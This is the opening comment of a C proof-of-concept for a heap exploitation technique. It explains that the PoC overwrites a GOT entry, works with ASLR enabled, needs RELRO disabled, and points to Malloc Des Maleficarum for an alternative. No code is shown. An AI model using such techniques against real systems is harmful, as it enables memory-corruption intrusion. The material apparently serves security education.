/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit.
